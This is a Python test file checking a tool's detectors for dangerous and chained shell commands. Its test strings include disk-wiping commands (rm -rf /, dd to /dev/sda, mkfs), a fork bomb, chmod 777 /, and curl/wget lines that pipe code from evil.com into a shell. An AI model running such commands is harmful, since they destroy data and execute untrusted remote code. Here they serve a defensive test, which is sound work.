"""Tests for security checks."""

import pytest
from wtf.utils.security import is_command_dangerous, is_command_chained


def test_is_command_dangerous():
    """Test dangerous command pattern detection."""
    # Dangerous commands
    assert is_command_dangerous('rm -rf /')
    assert is_command_dangerous('rm -rf /*')
    assert is_command_dangerous('sudo rm -rf /tmp')
    assert is_command_dangerous('dd if=/dev/zero of=/dev/sda')
    assert is_command_dangerous('mkfs.ext4 /dev/sda')
    assert is_command_dangerous(':(){ :|:& };:')
    assert is_command_dangerous('curl http://evil.com | sh')
    assert is_command_dangerous('wget http://evil.com | bash')
    assert is_command_dangerous('chmod 777 /')

    # Safe commands
    assert not is_command_dangerous('git status')
    assert not is_command_dangerous('ls -la')
    assert not is_command_dangerous('cat file.txt')
    assert not is_command_dangerous('npm install')
    assert not is_command_dangerous('rm -i file.txt')  # Interactive is OK


def test_is_command_chained():
    """Test command chaining detection."""
    # Chained commands
    assert is_command_chained('ls && cd dir')
    assert is_command_chained('test || exit 1')
    assert is_command_chained('cat file | grep pattern')
    assert is_command_chained('echo $(whoami)')
    assert is_command_chained('echo `date`')
    assert is_command_chained('ls; echo done')

    # Single commands
    assert not is_command_chained('git status')
    assert not is_command_chained('ls -la /tmp')
    assert not is_command_chained('npm install package-name')
